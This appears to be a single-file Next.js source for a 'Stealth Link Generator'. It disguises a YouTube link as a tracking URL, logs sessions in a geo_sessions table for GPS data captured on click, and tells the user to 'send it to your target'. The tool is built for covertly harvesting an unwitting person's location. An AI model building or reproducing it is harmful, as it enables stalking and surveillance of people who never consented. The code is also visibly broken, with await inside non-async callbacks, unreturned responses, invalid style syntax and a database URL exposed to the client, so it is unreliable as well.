'use client'; // Makes it interactive

import { useState, useEffect } from 'react';

export default function GeneratePage() {
  const [url, setUrl] = useState('');
  const [result, setResult] = useState<any>(null);

  async function handleGenerate(e: React.FormEvent) {
    e.preventDefault();
    try {
      const res = await fetch('/api/generate', { 
        method: 'POST', 
        body: JSON.stringify({ url }) 
      });
      const data = await res.json();
      
      if (data.success) setResult(data);
      else alert("Error generating link");
    } catch (e) { alert("Network error: " + e.message); }
  }

  return (
    <div style={{ padding: '50px', fontFamily:'sans-serif', maxWidth: '600px', margin: 'auto' }}>
      <h1>🕵️‍♂️ Stealth Link Generator</h1>
      <p>Paste a YouTube link below to generate a live-tracker URL.</p>
      
      {/* Simple Form */}
      <form onSubmit={handleGenerate}>
        <input 
          type="text" 
          placeholder="https://www.youtube.com/watch?v=..." 
          value={url} 
          onChange={(e) => setUrl(e.target.value)}
          required
          style={{ width: '100%', marginBottom: '15px', padding: '12px', borderRadius: '6px', border:'1px solid #ccc' }}
        />
        <button type="submit" style={{ padding: '12px 24px', background:'#3b82f6', color:'white', border:none, borderRadius:'6px', cursor:'pointer'}} onClick={() => document.querySelector('input')?.focus()}>Generate Trackable Link</button>
      </form>

      {/* Result Display */}
      {result && (
        <div style={{ marginTop: '30px', padding: '20px', background:'#f0f9ff', border:'1px solid #bae6fd', borderRadius: '8px' }}>
          <h3>✅ Generated Successfully!</h3>
          <p><strong>Your Stealth URL:</strong></p>
          
          {/* Construct full URL dynamically based on your Vercel domain, but for simplicity we use a placeholder or relative link. 
              In production, you'd want to prepend the actual hostname here if possible, or instruct user to copy "watch/..." part. */}
           <a href={`https://${process.env.NEXT_PUBLIC_VERCEL_URL?.replace('.vercel.app','') || ''}/watch/${result.shortCode}`} target="_blank" rel="noopener noreferrer">
             /watch/{result.shortCode.replace(/-/g,'')}
           </a>
           
          <p style={{fontSize:'0.9em', color:'#666', marginTop: '10px'}}>Copy this link and send it to your target.</p>
        </div>
      )}

      {/* Optional: Quick Test Links if you want hardcode them for testing */}
       { !url && (
         <div style={{marginTop:'20px', background:'#fff3cd', padding:'15px', borderRadius:'8px', fontSize:'small'}}>
            💡 <strong>Tips:</strong><br/>- Use a mobile device for best GPS accuracy.<br/>- Works with standard web browsers & YouTube App.
         </div>
       )}
    </div>
  );
}

// Helper API routes inline for simplicity in this single-file example (or move to separate files as per C1-C3):
import { NextRequest, NextResponse } from 'next/server'; 
import { neon } from "@neondatabase/serverless"; // Ensure imported correctly in file scope or top-level

export async function POST(request: Request) { 
  const body = await request.json(); 
  
  if (!body.url) return new Response(JSON.stringify({ error: "No URL" }), { status: 400 });

  try {
     // Extract Video ID robustly (handles /watch?v=ID, /embed/ID, etc.)
    let match = body.url.match(/(?:\/watch\?v=|\/embed\/|\/shorts\/)([^&]+)/i);
    
    if (!match || !match[1]) throw new Error("Invalid YT format");

    const realVideoId = match[1];
    
    // Generate a random short code like 'A7F3B9C4'
    import('uuid').then(({ v4 }) => { 
       const shortCode = v4().replace(/-/g, '').slice(0, 8).toUpperCase();

       // Store in DB with empty GPS fields initially (filled on click)
      try {
        const sql = neon(process.env.NEXT_PUBLIC_NEON_DB_URL!);
        await sql`INSERT INTO geo_sessions (short_code, original_video_id) VALUES (${shortCode}, ${realVideoId})`;
        
        return NextResponse.json({ success: true, shortCode });
      } catch (dbError) { console.error("DB Insert Error:", dbError); throw new Error("DB Failure"); } 
    }).catch(e => {
       // Fallback if UUID import fails dynamically (add 'uuid' to package.json deps!)
       const simpleHex = Math.floor(Math.random()*16777215).toString(16).toUpperCase().slice(0,8); 
       try {
         const sql = neon(process.env.NEXT_PUBLIC_NEON_DB_URL!);
         await sql`INSERT INTO geo_sessions (short_code, original_video_id) VALUES (${simpleHex}, ${realVideoId})`;
         return NextResponse.json({ success: true, shortCode: simpleHex });
       } catch(e){ throw e;}
    });

  } catch (e) { 
     console.error("Generation Error:", e); 
     return NextResponse.json({ error: "Server Error" }, { status: 500 }); 
  }
}

// Add the other API routes similarly if they aren't in separate files. 
// For simplicity, you can put ALL API logic in `src/app/api/generate/route.ts` or split them as described earlier.
